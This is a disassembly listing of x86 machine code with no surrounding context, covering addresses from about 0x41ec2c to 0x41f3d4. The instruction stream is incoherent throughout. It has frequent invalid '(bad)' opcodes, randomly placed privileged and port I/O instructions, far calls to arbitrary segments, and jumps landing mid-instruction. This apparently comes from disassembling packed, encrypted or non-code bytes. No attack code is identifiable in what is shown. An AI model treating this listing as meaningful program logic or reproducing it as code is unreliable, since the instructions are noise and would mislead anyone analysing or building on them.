  41ec2c:	add    ah,BYTE PTR [edi-0x7f06596c]
  41ec32:	jne    0x41ebc2
  41ec34:	ret    
  41ec35:	mov    cl,0xb6
  41ec38:	sahf   
  41ec39:	fincstp 
  41ec3b:	lock or eax,0x6323544e
  41ec41:	scas   eax,DWORD PTR es:[edi]
  41ec42:	loopne 0x41ec1c
  41ec44:	call   0x483921e3
  41ec49:	mov    cl,0xc2
  41ec4b:	fistp  WORD PTR [edi]
  41ec4d:	inc    ecx
  41ec4e:	(bad)  
  41ec4f:	ds popf 
  41ec51:	and    esi,ebx
  41ec53:	test   al,0x50
  41ec55:	xchg   ecx,eax
  41ec56:	fxch   st(1)
  41ec58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec59:	sub    eax,0xf81fe5c6
  41ec5e:	add    bh,BYTE PTR [eax+ecx*1-0x6fd2a5ac]
  41ec65:	xor    DWORD PTR [esi+0x15983f29],esp
  41ec6b:	sbb    dh,BYTE PTR [edx-0x1d3cfdbf]
  41ec71:	aam    0x11
  41ec73:	sub    ebx,DWORD PTR [ebp+0x6484dff4]
  41ec79:	push   edi
  41ec7a:	sbb    eax,0x986be259
  41ec7f:	mov    edx,0xa57fdfe5
  41ec84:	lods   al,BYTE PTR ds:[esi]
  41ec85:	aaa    
  41ec86:	call   0xcdd6:0x7985c1c8
  41ec8d:	xlat   BYTE PTR ds:[ebx]
  41ec8e:	shl    BYTE PTR [edx+0x26a3b855],0x90
  41ec95:	xlat   BYTE PTR ds:[ebx]
  41ec96:	fcmovnb st,st(5)
  41ec98:	cs sbb ebx,edi
  41ec9b:	jno    0x41ed06
  41ec9d:	popa   
  41ec9e:	push   es
  41ec9f:	cwde   
  41eca0:	repnz push esi
  41eca2:	push   esp
  41eca3:	rcr    dh,cl
  41eca5:	sar    BYTE PTR [eax+0x6e],1
  41eca8:	sbb    ah,cl
  41ecaa:	mov    esi,0x6029
	...
  41ecbb:	xor    dl,bl
  41ecbd:	into   
  41ecbe:	mov    ds:0xd37ebfef,al
  41ecc3:	sub    edi,DWORD PTR [esi]
  41ecc5:	out    0x3f,eax
  41ecc7:	push   eax
  41ecc8:	xchg   BYTE PTR [ebx],ah
  41ecca:	xchg   ebp,eax
  41eccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eccc:	pop    DWORD PTR [ecx]
  41ecce:	add    BYTE PTR [edx+0x17000000],ch
  41ecd4:	fsub   DWORD PTR [edi+0x3d4cb074]
  41ecda:	mov    al,0x6b
  41ecdc:	inc    ebx
  41ecdd:	std    
  41ecde:	pop    ecx
  41ecdf:	loope  0x41ec94
  41ece1:	dec    eax
  41ece2:	mov    dh,0x57
  41ece4:	jle    0x41eccd
  41ece6:	and    esp,DWORD PTR [edx]
  41ece8:	test   al,0x6d
  41ecea:	into   
  41eceb:	pusha  
  41ecec:	and    al,0xe8
  41ecee:	data16 fstp DWORD PTR [edx]
  41ecf1:	inc    edi
  41ecf2:	adc    bl,0xd1
  41ecf5:	xchg   edx,eax
  41ecf6:	gs (bad) 
  41ecf8:	mov    bl,0x41
  41ecfa:	dec    ecx
  41ecfb:	outs   dx,BYTE PTR ds:[esi]
  41ecfc:	mov    eax,ds:0x55d54919
  41ed01:	jge    0x41ed0d
  41ed03:	mov    edi,0x77077ec9
  41ed08:	icebp  
  41ed09:	mov    dl,0xd5
  41ed0b:	jg     0x41ed6d
  41ed0d:	push   ebp
  41ed0e:	cmp    ah,BYTE PTR [edx+0x67bb98b]
  41ed14:	test   al,0x9b
  41ed16:	dec    ebx
  41ed17:	xor    al,0x39
  41ed19:	imul   ecx,DWORD PTR ds:0x64a28a9e,0x6084286
  41ed23:	pop    edx
  41ed24:	lods   eax,DWORD PTR ds:[esi]
  41ed25:	shl    DWORD PTR [esp+edi*4+0x67],0x9b
  41ed2a:	cmp    DWORD PTR [ebx],edx
  41ed2c:	jb     0x41ed21
  41ed2e:	push   ebx
  41ed2f:	adc    DWORD PTR [eax+eax*2+0x3189f6ac],esi
  41ed36:	adc    eax,0x68b54352
  41ed3b:	jns    0x41ed34
  41ed3d:	das    
  41ed3e:	mov    bh,0x7a
  41ed40:	mov    esi,0x6aca8d7d
  41ed45:	adc    DWORD PTR [ecx],esp
  41ed47:	jl     0x41ecda
  41ed49:	push   0x54
  41ed4b:	call   0xdfb8:0x3fa5d07
  41ed52:	push   ebx
  41ed53:	rcr    DWORD PTR [ebx+0x26d97445],1
  41ed59:	or     BYTE PTR [ecx],bl
  41ed5b:	pushf  
  41ed5c:	frstor [esi-0x5d46f222]
  41ed62:	xlat   BYTE PTR ds:[ebx]
  41ed63:	jb     0x41ede0
  41ed65:	mov    edi,0xac9f5101
  41ed6a:	out    0x8b,eax
  41ed6c:	push   ss
  41ed6d:	into   
  41ed6e:	mov    bl,0x74
  41ed70:	mov    ah,0x8f
  41ed72:	(bad)  
  41ed73:	out    dx,al
  41ed74:	xchg   edx,eax
  41ed75:	push   eax
  41ed76:	fst    DWORD PTR [eax+0x3d664805]
  41ed7c:	xor    BYTE PTR [eax],al
	...
  41ed8a:	add    bl,bl
  41ed8c:	in     eax,dx
  41ed8d:	outs   dx,BYTE PTR ds:[esi]
  41ed8e:	and    bh,BYTE PTR [esi-0x5d]
  41ed91:	(bad)  
  41ed93:	pop    esi
  41ed94:	(bad)  
  41ed95:	mov    DWORD PTR [ebp+0x44f0f77a],ecx
  41ed9b:	dec    edi
  41ed9c:	nop
  41ed9d:	add    DWORD PTR [eax],eax
  41ed9f:	stos   BYTE PTR es:[edi],al
  41eda0:	add    BYTE PTR [eax],al
  41eda2:	add    BYTE PTR [eax],al
  41eda4:	sub    al,BYTE PTR [edx]
  41eda6:	pop    esi
  41eda7:	jle    0x41ed95
  41eda9:	cmp    bl,BYTE PTR [edi+0x3710a7b9]
  41edaf:	lahf   
  41edb0:	adc    ah,BYTE PTR [ebp-0x44320650]
  41edb6:	push   edx
  41edb7:	icebp  
  41edb8:	inc    ecx
  41edb9:	int    0x24
  41edbb:	lock out 0xdd,al
  41edbe:	adc    al,0xb
  41edc0:	fs jo  0x41ed67
  41edc3:	fstp   TBYTE PTR [ebx-0x5e]
  41edc6:	(bad)  
  41edc7:	cmp    ebx,DWORD PTR [ecx]
  41edc9:	or     al,0x2e
  41edcb:	push   edx
  41edcc:	mov    ch,0x7a
  41edce:	fidivr WORD PTR [ecx+0x12]
  41edd1:	sar    BYTE PTR [esi+0x20922ad6],0x13
  41edd8:	pop    esi
  41edd9:	mov    esi,0x26a6a699
  41edde:	dec    esi
  41eddf:	ja     0x41ee0d
  41ede1:	sbb    DWORD PTR [eax+edx*2-0x7ad2afc3],0xffffffd9
  41ede9:	cmp    eax,0xa569587b
  41edee:	popa   
  41edef:	cmp    dh,bh
  41edf1:	pop    ss
  41edf2:	dec    ebp
  41edf3:	pop    es
  41edf4:	cmp    eax,DWORD PTR [eax-0x2fa81926]
  41edfa:	sahf   
  41edfb:	in     eax,0x4
  41edfd:	mov    DWORD PTR [esi+0x3e],edx
  41ee00:	js     0x41ed9a
  41ee02:	or     cl,bl
  41ee04:	jge    0x41edb5
  41ee06:	in     eax,dx
  41ee07:	dec    esi
  41ee08:	pop    esp
  41ee09:	int    0x37
  41ee0b:	or     edi,ecx
  41ee0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee0e:	mov    ebx,0xa4870b79
  41ee13:	mov    fs,esp
  41ee15:	data16 fist WORD PTR [esi+0x7e]
  41ee19:	out    0x6e,al
  41ee1b:	dec    ebp
  41ee1c:	imul   ebx,DWORD PTR [edi+0x4eda64dc],0xd558e74c
  41ee26:	leave  
  41ee27:	add    bl,BYTE PTR [eax]
  41ee29:	jg     0x41edff
  41ee2b:	xor    BYTE PTR [edx-0x39a47d5e],dh
  41ee31:	test   BYTE PTR [edi-0x1a],0x68
  41ee35:	cmp    edx,DWORD PTR [edi-0x58a315d]
  41ee3b:	dec    esi
  41ee3c:	pop    ss
  41ee3d:	inc    eax
  41ee3e:	and    eax,edi
  41ee40:	fwait
  41ee41:	mov    eax,0x368f067a
  41ee46:	cmp    al,0x37
  41ee48:	or     eax,DWORD PTR [ecx-0x34]
  41ee4b:	ss push ebp
	...
  41ee59:	add    BYTE PTR [eax],al
  41ee5b:	add    eax,0x6f976b22
  41ee60:	(bad)  
  41ee62:	mov    dl,0x66
  41ee64:	and    BYTE PTR [esi-0x25876496],ah
  41ee6a:	add    ecx,edi
  41ee6c:	nop
  41ee6d:	add    DWORD PTR [eax],eax
  41ee6f:	stos   BYTE PTR es:[edi],al
  41ee70:	add    BYTE PTR [eax],al
  41ee72:	add    BYTE PTR [edi-0x41],bh
  41ee75:	sbb    ebp,eax
  41ee77:	fwait
  41ee78:	lahf   
  41ee79:	retf   0xeecd
  41ee7c:	mov    WORD PTR [esi+0x6],ds
  41ee7f:	xchg   DWORD PTR [ebx-0xd],eax
  41ee82:	pop    es
  41ee83:	jo     0x41ee79
  41ee85:	cwde   
  41ee86:	pushf  
  41ee87:	pop    esp
  41ee88:	push   esp
  41ee89:	mov    bh,0x4b
  41ee8b:	gs mov edi,0x73edc12e
  41ee91:	sbb    BYTE PTR [esi+edx*4],ah
  41ee94:	pop    ds
  41ee95:	in     al,0xac
  41ee97:	sub    ebp,DWORD PTR [eax+edx*2+0x5b]
  41ee9b:	inc    ebx
  41ee9c:	retf   
  41ee9d:	test   esp,esi
  41ee9f:	pop    esp
  41eea0:	mov    BYTE PTR ds:0x34a9d37f,cl
  41eea6:	pushf  
  41eea7:	stos   BYTE PTR es:[edi],al
  41eea8:	imul   edx,DWORD PTR [ecx-0x42550228],0xffffffca
  41eeaf:	ret    0x8b72
  41eeb2:	push   esp
  41eeb3:	sbb    al,0x12
  41eeb5:	push   eax
  41eeb6:	push   ecx
  41eeb7:	inc    edx
  41eeb8:	xor    bh,ch
  41eeba:	or     dl,BYTE PTR [ebx-0x52350ee3]
  41eec0:	lea    edx,[esi-0x72e16d1]
  41eec6:	cli    
  41eec7:	xor    BYTE PTR [eax+edx*2+0x71d93430],bl
  41eece:	and    cl,bh
  41eed0:	sbb    cl,BYTE PTR [esi]
  41eed2:	imul   esi,esi,0xffffff8e
  41eed5:	jecxz  0x41ee86
  41eed7:	mov    bl,0x87
  41eed9:	leave  
  41eeda:	les    edi,FWORD PTR [ebx-0x79fff86f]
  41eee0:	loop   0x41eeb7
  41eee2:	int3   
  41eee3:	inc    esi
  41eee4:	sub    ch,BYTE PTR [edi]
  41eee6:	mov    bl,dl
  41eee8:	and    edx,DWORD PTR [edi+0x11b55ea]
  41eeee:	mov    ah,0x97
  41eef0:	add    eax,0x847f3ff8
  41eef5:	add    dl,BYTE PTR [ecx+0x695f5fdc]
  41eefb:	adc    edi,ebx
  41eefd:	sahf   
  41eefe:	lahf   
  41eeff:	jns    0x41ef21
  41ef01:	loopne 0x41eecc
  41ef03:	out    0x26,al
  41ef05:	and    DWORD PTR [esi],0xffffff93
  41ef08:	arpl   bp,bp
  41ef0a:	push   edi
  41ef0b:	jne    0x41eeda
  41ef0d:	pop    edx
  41ef0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef0f:	mov    ecx,ecx
  41ef11:	jne    0x41ef06
  41ef13:	adc    ah,BYTE PTR [ebx+eax*1-0x47970fab]
  41ef1a:	std    
  41ef1b:	add    DWORD PTR [eax+0x0],edi
	...
  41ef29:	add    BYTE PTR [eax],al
  41ef2b:	mov    edx,esp
  41ef2d:	and    al,0xd9
  41ef2f:	jg     0x41ef2a
  41ef31:	call   esi
  41ef33:	into   
  41ef34:	inc    ebp
  41ef35:	mov    bh,0x11
  41ef37:	mov    ch,0x86
  41ef39:	xor    DWORD PTR [ebx+eiz*4-0x55fffe6f],0x0
  41ef41:	add    BYTE PTR [eax],al
  41ef43:	xor    DWORD PTR [esi-0x7e],esi
  41ef46:	dec    ecx
  41ef47:	popa   
  41ef48:	jmp    0x4f80:0xc610231c
  41ef4f:	call   0xf32284b
  41ef54:	mov    bh,0x7a
  41ef56:	mov    bl,0xeb
  41ef58:	scas   al,BYTE PTR es:[edi]
  41ef59:	je     0x41ef1e
  41ef5b:	mov    dh,0x4
  41ef5d:	dec    BYTE PTR [ebx]
  41ef5f:	pop    es
  41ef60:	pop    esp
  41ef61:	outs   dx,BYTE PTR ds:[esi]
  41ef62:	mov    bh,0x56
  41ef64:	push   eax
  41ef65:	jge    0x41ef93
  41ef67:	lea    edx,[esi+0x562e425d]
  41ef6d:	push   esp
  41ef6e:	xor    esi,DWORD PTR [edi]
  41ef70:	(bad)
  41ef73:	pop    esi
  41ef74:	call   0xd50ae3b
  41ef79:	sub    eax,0x29a53444
  41ef7e:	jecxz  0x41ef06
  41ef80:	(bad)
  41ef84:	xlat   BYTE PTR ds:[ebx]
  41ef85:	stos   BYTE PTR es:[edi],al
  41ef86:	aas    
  41ef87:	data16 mov bl,0x75
  41ef8a:	xlat   BYTE PTR ds:[ebx]
  41ef8b:	(bad)  
  41ef8c:	out    0x48,al
  41ef8e:	jbe    0x41efc8
  41ef90:	pusha  
  41ef91:	mov    esp,0x791df62
  41ef96:	pop    ebx
  41ef97:	cmp    edx,DWORD PTR [edi]
  41ef99:	and    DWORD PTR [edx-0x16d8a387],esp
  41ef9f:	pushf  
  41efa0:	out    dx,eax
  41efa1:	mov    dh,0x4c
  41efa3:	or     eax,0x3934d9fb
  41efa8:	ins    BYTE PTR es:[edi],dx
  41efa9:	mov    cs,WORD PTR [ecx-0x6544af3f]
  41efaf:	neg    DWORD PTR [ebp+0x15]
  41efb2:	cmp    al,0xd4
  41efb4:	push   esp
  41efb6:	cli    
  41efb7:	iret   
  41efb8:	loope  0x41ef60
  41efba:	push   esi
  41efbb:	xchg   ebx,eax
  41efbc:	rcl    BYTE PTR [eax],0x59
  41efbf:	push   ecx
  41efc0:	ret    
  41efc1:	mov    ecx,0x613e63ed
  41efc6:	sbb    ebp,DWORD PTR [ecx-0x40]
  41efc9:	pop    ebp
  41efca:	sbb    ebp,DWORD PTR [ebx]
  41efcc:	cdq    
  41efcd:	daa    
  41efce:	jo     0x41ef83
  41efd0:	aam    0xf2
  41efd2:	mov    dh,bh
  41efd4:	stos   BYTE PTR es:[edi],al
  41efd5:	jne    0x41efb7
  41efd7:	pushf  
  41efd8:	dec    DWORD PTR [ebp-0x10ff6355]
  41efde:	dec    eax
  41efdf:	fstp   TBYTE PTR [ebx+0x67]
  41efe2:	adc    eax,0x1d4dc122
  41efe7:	imul   ebp,DWORD PTR [edi],0x863af319
	...
  41eff9:	add    BYTE PTR [eax],al
  41effb:	fisubr WORD PTR [ecx]
  41effd:	cwde   
  41effe:	sar    bh,cl
  41f000:	repz fisubr WORD PTR ds:0x4af35f6
  41f007:	lock push es
  41f009:	and    al,BYTE PTR [ecx+0x4d]
  41f00c:	xchg   edx,eax
  41f00d:	add    DWORD PTR [eax],eax
  41f00f:	stos   BYTE PTR es:[edi],al
  41f010:	add    BYTE PTR [eax],al
  41f012:	add    ch,cl
  41f014:	inc    ecx
  41f015:	rol    BYTE PTR [edi+ecx*8-0x1e267165],cl
  41f01c:	or     al,0x5b
  41f01e:	test   DWORD PTR [eax],edi
  41f020:	dec    eax
  41f021:	(bad)  
  41f022:	mov    dh,0x23
  41f024:	adc    al,0xf7
  41f026:	mov    bh,BYTE PTR [ecx-0x68470fa]
  41f02c:	fs jae 0x41f09f
  41f02f:	jne    0x41f06d
  41f031:	mov    ch,0xa5
  41f033:	sahf   
  41f034:	sub    eax,0x519c9436
  41f039:	int3   
  41f03a:	mov    eax,0x41c1ccf5
  41f03f:	inc    edi
  41f040:	dec    ecx
  41f041:	lods   eax,DWORD PTR ds:[esi]
  41f042:	sub    ecx,DWORD PTR [ebp+ecx*1-0x47]
  41f046:	sbb    eax,0x6288d8ee
  41f04b:	mov    dl,dl
  41f04d:	push   esi
  41f04e:	mov    edi,0xe6acb05b
  41f053:	rcl    BYTE PTR [edx+esi*1+0x2b],cl
  41f057:	dec    ebx
  41f058:	rcr    BYTE PTR [ebx+eax*8-0x4796eb65],cl
  41f05f:	cmp    dl,al
  41f061:	dec    esp
  41f062:	adc    esi,DWORD PTR [esi-0x59]
  41f065:	fdiv   DWORD PTR [edx]
  41f067:	inc    edi
  41f068:	dec    edi
  41f069:	sub    ch,BYTE PTR [eax]
  41f06b:	inc    edi
  41f06c:	cmp    DWORD PTR [eax-0x6e],ecx
  41f06f:	(bad)  
  41f070:	ficom  WORD PTR [esi-0x26179b0]
  41f076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f077:	hlt    
  41f078:	retf   
  41f079:	jno    0x41f04a
  41f07b:	mov    cl,0x39
  41f07d:	arpl   WORD PTR [edi-0x534c6330],sp
  41f083:	inc    edi
  41f084:	mov    bl,0x9a
  41f086:	dec    ebx
  41f087:	sbb    BYTE PTR [edx],dh
  41f089:	and    edi,DWORD PTR [edx+ebx*4-0x30912bf6]
  41f090:	xor    dl,ah
  41f092:	adc    edx,DWORD PTR [ecx]
  41f094:	hlt    
  41f095:	jp     0x41f084
  41f097:	sub    edx,DWORD PTR [edi+ecx*1]
  41f09a:	int    0xd0
  41f09c:	dec    ecx
  41f09d:	add    edx,DWORD PTR [ecx-0x38]
  41f0a0:	loop   0x41f041
  41f0a2:	out    dx,al
  41f0a3:	fstp   TBYTE PTR [eax]
  41f0a5:	or     bl,ch
  41f0a7:	pop    edx
  41f0a8:	jmp    0xf706:0x76af8b3e
  41f0af:	(bad)  
  41f0b0:	adc    BYTE PTR [eax+eiz*2-0x4a],0x7c
  41f0b5:	scas   eax,DWORD PTR es:[edi]
  41f0b6:	fmulp  st(2),st
  41f0b8:	js     0x41f08b
  41f0ba:	hlt    
  41f0bb:	lods   al,BYTE PTR ds:[esi]
  41f0bc:	jo     0x41f0be
	...
  41f0ca:	add    BYTE PTR [esi+0x3f],cl
  41f0cd:	int3   
  41f0ce:	sbb    eax,0x7fdffffd
  41f0d3:	out    dx,eax
  41f0d4:	loopne 0x41f0ec
  41f0d6:	lods   al,BYTE PTR ds:[esi]
  41f0d7:	push   cs
  41f0d8:	xor    dl,dl
  41f0da:	in     al,dx
  41f0db:	not    DWORD PTR [edx+0xaa0001]
  41f0e1:	add    BYTE PTR [eax],al
  41f0e3:	push   eax
  41f0e4:	mov    ds:0x27ad91a0,al
  41f0e9:	mov    dh,0xfe
  41f0eb:	mov    al,ds:0x353b46ea
  41f0f0:	out    0x47,eax
  41f0f2:	mov    BYTE PTR [edi+esi*2-0x7dd1f3a5],bh
  41f0f9:	hlt    
  41f0fa:	or     bh,BYTE PTR [eax-0x22f98072]
  41f100:	into   
  41f101:	retf   
  41f102:	add    al,0x81
  41f104:	ror    DWORD PTR ds:0x401bacd8,0xaf
  41f10b:	cmp    DWORD PTR [edi-0x6f2d4212],0xffffffdc
  41f112:	add    edi,DWORD PTR [edi]
  41f114:	addr16 push esp
  41f116:	dec    ebp
  41f117:	(bad)  [ebx+0x43370193]
  41f11d:	ror    BYTE PTR [edi+edx*1+0x2e],0x42
  41f122:	add    ecx,ebp
  41f124:	dec    esp
  41f125:	mov    edi,cs
  41f127:	ftst   
  41f129:	aas    
  41f12a:	cld    
  41f12b:	sub    BYTE PTR [ecx+0x2f],bh
  41f12e:	cmp    BYTE PTR [edx-0x65],bl
  41f131:	xchg   al,ch
  41f133:	pop    edi
  41f134:	std    
  41f135:	fwait
  41f136:	stos   BYTE PTR es:[edi],al
  41f137:	sub    eax,0x10a74740
  41f13c:	cld    
  41f13d:	pop    edx
  41f13e:	xor    eax,0x7da98353
  41f143:	xor    DWORD PTR [edi],0x17dd728f
  41f149:	xchg   ebp,eax
  41f14a:	call   0xf09a2475
  41f14f:	shl    eax,cl
  41f151:	dec    ebx
  41f152:	jno    0x41f0ef
  41f154:	inc    ebp
  41f155:	mov    BYTE PTR [edi+0x3d],dh
  41f158:	ds mov ebp,0x171a42fb
  41f15e:	add    BYTE PTR [ebp+ecx*8-0x22988c3b],dl
  41f165:	xchg   ebp,eax
  41f166:	push   ds
  41f167:	jnp    0x41f13c
  41f169:	pop    esp
  41f16a:	jmp    0x41f14b
  41f16c:	arpl   bp,cx
  41f16e:	xchg   ebp,eax
  41f16f:	and    al,0x1f
  41f171:	je     0x41f1a8
  41f173:	or     ah,bl
  41f175:	add    al,0x8a
  41f177:	or     BYTE PTR [edi+0x49],al
  41f17a:	out    0xd9,eax
  41f17c:	icebp  
  41f17d:	adc    BYTE PTR [eax-0x2e],0x16
  41f181:	leave  
  41f182:	jnp    0x41f179
  41f184:	pop    ebp
  41f185:	pop    ds
  41f186:	and    DWORD PTR [esi+0x2e],0x167ee78a
	...
  41f199:	add    BYTE PTR [eax],al
  41f19b:	push   ds
  41f19c:	test   eax,0x7ff735f6
  41f1a1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1a7:	dec    edx
  41f1a8:	rcr    BYTE PTR [eax+0x193a14f],0x0
  41f1af:	stos   BYTE PTR es:[edi],al
  41f1b0:	add    BYTE PTR [eax],al
  41f1b2:	add    ch,al
  41f1b4:	xor    al,0xea
  41f1b6:	cmp    bh,BYTE PTR [esi+0x2332045d]
  41f1bc:	pop    edx
  41f1bd:	in     eax,0xdd
  41f1bf:	jo     0x41f1ed
  41f1c1:	(bad)  
  41f1c2:	xchg   ebx,eax
  41f1c3:	paddq  mm5,mm0
  41f1c6:	ins    DWORD PTR es:[edi],dx
  41f1c7:	sahf   
  41f1c8:	dec    esp
  41f1c9:	lods   eax,DWORD PTR ds:[esi]
  41f1ca:	mov    esi,DWORD PTR [edi-0x69]
  41f1cd:	ins    BYTE PTR es:[edi],dx
  41f1ce:	aad    0x31
  41f1d0:	dec    ecx
  41f1d1:	jle    0x41f1ee
  41f1d3:	std    
  41f1d4:	mov    gs,ebx
  41f1d6:	pushf  
  41f1d7:	xor    DWORD PTR [esi-0x6684aefd],0x59
  41f1de:	xor    edx,DWORD PTR [esp+ecx*8]
  41f1e1:	jl     0x41f202
  41f1e3:	adc    eax,0x153099ed
  41f1e8:	(bad)  
  41f1e9:	cwde   
  41f1ea:	out    0x29,al
  41f1ec:	mov    ds:0x84af450e,eax
  41f1f1:	jb     0x41f1d1
  41f1f3:	mov    ch,0x56
  41f1f5:	out    0x58,eax
  41f1f7:	mov    fs,esp
  41f1f9:	push   es
  41f1fa:	cbw    
  41f1fc:	nop
  41f1fd:	mov    ebx,0xcd5c4f84
  41f202:	test   DWORD PTR ds:0xeec2e148,ecx
  41f208:	data16 mov al,0x1c
  41f20b:	inc    esp
  41f20c:	jecxz  0x41f23e
  41f20e:	ja     0x41f277
  41f210:	fisub  DWORD PTR [eax]
  41f212:	jne    0x41f20c
  41f214:	lahf   
  41f215:	pop    eax
  41f216:	add    ch,0xf4
  41f219:	pushf  
  41f21a:	xlat   BYTE PTR ds:[ebx]
  41f21b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f21c:	push   cs
  41f21d:	ror    DWORD PTR [esi*8-0x18142f3b],0xa5
  41f225:	pop    ecx
  41f226:	jo     0x41f274
  41f228:	inc    eax
  41f229:	je     0x41f26b
  41f22b:	mov    ds:0x3fef67a8,eax
  41f230:	rol    DWORD PTR [ecx-0x1],0x9f
  41f234:	mov    eax,0xb0eb15d6
  41f239:	jb     0x41f1f2
  41f23b:	and    DWORD PTR [ebx-0x7e],0xffffffad
  41f23f:	popa   
  41f240:	sbb    al,0xb2
  41f242:	adc    cl,BYTE PTR [eax+0x64dc5f4]
  41f248:	popa   
  41f249:	sub    BYTE PTR [ecx-0x55],bl
  41f24c:	xchg   edi,eax
  41f24d:	test   al,0xaf
  41f24f:	push   cs
  41f250:	cmp    ch,BYTE PTR [edi+0x1c0d2347]
  41f256:	push   eax
  41f257:	push   esi
  41f258:	fdiv   DWORD PTR [eax+0x3c2952]
	...
  41f26a:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  41f270:	lods   eax,DWORD PTR ds:[esi]
  41f271:	fcomi  st,st(7)
  41f273:	sar    BYTE PTR [ebx],cl
  41f275:	(bad)  
  41f276:	add    BYTE PTR [edi+0x4bf4b067],ah
  41f27c:	xchg   esp,eax
  41f27d:	add    DWORD PTR [eax],eax
  41f27f:	stos   BYTE PTR es:[edi],al
  41f280:	add    BYTE PTR [eax],al
  41f282:	add    BYTE PTR [ecx+0x391cbb3a],bh
  41f288:	and    eax,eax
  41f28a:	jmp    0x9cdae8b3
  41f28f:	sub    BYTE PTR [ecx-0x33b02e56],cl
  41f295:	mov    esi,0x53701a11
  41f29a:	pop    ecx
  41f29b:	jae    0x41f2f0
  41f29d:	cmp    eax,0xd6135da3
  41f2a2:	aad    0xe0
  41f2a4:	xchg   esp,eax
  41f2a5:	sub    BYTE PTR [edi+0x38],bh
  41f2a8:	jo     0x41f2ad
  41f2aa:	cmp    al,0xa0
  41f2ac:	push   edi
  41f2ad:	loop   0x41f2d9
  41f2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2b1:	shl    BYTE PTR [esp+eiz*8-0x1706306e],1
  41f2b8:	outs   dx,BYTE PTR ds:[esi]
  41f2b9:	xor    eax,0x398cec3
  41f2be:	btc    edx,0xe0
  41f2c2:	sbb    DWORD PTR [ebp-0x6f40165e],edi
  41f2c8:	call   0x1a62:0x519eb39b
  41f2cf:	lods   al,BYTE PTR ds:[esi]
  41f2d0:	popf   
  41f2d1:	pop    ss
  41f2d2:	out    0x3f,eax
  41f2d4:	jge    0x41f2a3
  41f2d6:	push   edx
  41f2d7:	mov    esi,0xf555bfb8
  41f2dc:	fisttp QWORD PTR [edi-0x6a]
  41f2df:	cwde   
  41f2e0:	in     al,0x21
  41f2e2:	mov    dh,0xed
  41f2e4:	xchg   DWORD PTR [esi-0x3699e141],esp
  41f2ea:	push   ds
  41f2eb:	pusha  
  41f2ec:	hlt    
  41f2ed:	std    
  41f2ee:	aaa    
  41f2ef:	cmp    al,0x94
  41f2f1:	fisubr WORD PTR [edx+ebx*8]
  41f2f4:	ins    BYTE PTR es:[edi],dx
  41f2f5:	pop    eax
  41f2f6:	pushf  
  41f2f7:	push   ecx
  41f2f8:	inc    edi
  41f2f9:	hlt    
  41f2fa:	jp     0x41f31e
  41f2fc:	pop    ds
  41f2fd:	push   0x28446fc0
  41f302:	in     al,dx
  41f303:	stc    
  41f304:	hlt    
  41f305:	test   edx,edi
  41f307:	sahf   
  41f308:	xchg   edi,eax
  41f309:	pop    edi
  41f30a:	aam    0xd1
  41f30c:	push   cs
  41f30d:	ret    0xca1e
  41f310:	jge    0x41f2b9
  41f312:	sbb    eax,0x9cd6d873
  41f317:	add    cl,bh
  41f319:	out    0x80,al
  41f31b:	test   al,0xdf
  41f31d:	jmp    0x232d:0xa34c5c32
  41f324:	cmp    al,0x3c
  41f326:	jle    0x41f33b
  41f328:	dec    ecx
  41f329:	js     0x41f35d
  41f32b:	fimul  WORD PTR [esi+0x0]
	...
  41f339:	add    BYTE PTR [eax],al
  41f33b:	or     bh,dh
  41f33d:	ja     0x41f389
  41f33f:	dec    edx
  41f341:	cmp    eax,0x2e8eedf7
  41f346:	dec    eax
  41f347:	adc    eax,0xf502a7ef
  41f34c:	xchg   esp,eax
  41f34d:	add    DWORD PTR [eax],eax
  41f34f:	stos   BYTE PTR es:[edi],al
  41f350:	add    BYTE PTR [eax],al
  41f352:	add    BYTE PTR [eax-0x7c9bbac3],bl
  41f358:	and    al,0x27
  41f35a:	loopne 0x41f3b5
  41f35c:	or     edi,esi
  41f35e:	loope  0x41f3a1
  41f360:	mov    BYTE PTR cs:[edi+0x6730b193],cl
  41f367:	aad    0x3a
  41f369:	jp     0x41f2ef
  41f36b:	sbb    DWORD PTR [ecx+0x306b5a10],edx
  41f371:	cmp    DWORD PTR [ebx+0x3f83888c],eax
  41f377:	jbe    0x41f3eb
  41f379:	pop    eax
  41f37a:	mov    DWORD PTR [eax],ebx
  41f37c:	pusha  
  41f37d:	add    al,BYTE PTR [esi-0x6]
  41f380:	push   cs
  41f381:	mov    WORD PTR [edx+0x7a],es
  41f384:	in     eax,0xeb
  41f386:	dec    esp
  41f387:	outs   dx,DWORD PTR ds:[esi]
  41f388:	bound  esp,QWORD PTR [edi]
  41f38a:	popa   
  41f38b:	jb     0x41f3d3
  41f38d:	aas    
  41f38e:	pop    ebx
  41f38f:	inc    ecx
  41f390:	sub    eax,0xbdaadd7
  41f395:	retf   
  41f396:	(bad)  
  41f397:	frstor [ebp-0x30]
  41f39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f39b:	cmp    eax,0x5134c3c2
  41f3a0:	lods   eax,DWORD PTR ds:[esi]
  41f3a1:	pop    es
  41f3a2:	fidiv  WORD PTR [edi+eiz*4-0x20]
  41f3a6:	mov    dl,0xc9
  41f3a8:	or     al,0x5c
  41f3aa:	dec    ebp
  41f3ab:	add    eax,0x95b9be5f
  41f3b0:	std    
  41f3b1:	sbb    esi,DWORD PTR [eax]
  41f3b3:	or     ecx,DWORD PTR [eax]
  41f3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b6:	lock cmp eax,0xd0c0a399
  41f3bc:	ins    DWORD PTR es:[edi],dx
  41f3bd:	jnp    0x41f3cf
  41f3bf:	in     al,0xb4
  41f3c1:	pop    ss
  41f3c2:	into   
  41f3c3:	outs   dx,DWORD PTR ds:[esi]
  41f3c4:	(bad)  
  41f3c5:	push   DWORD PTR [eax-0x71727820]
  41f3cb:	cdq    
  41f3cc:	push   edi
  41f3cd:	mov    esp,0x5b3368bc
  41f3d2:	ja     0x41f39c
  41f3d4:	adc    bh,BYTE PTR [ebp+0x68]
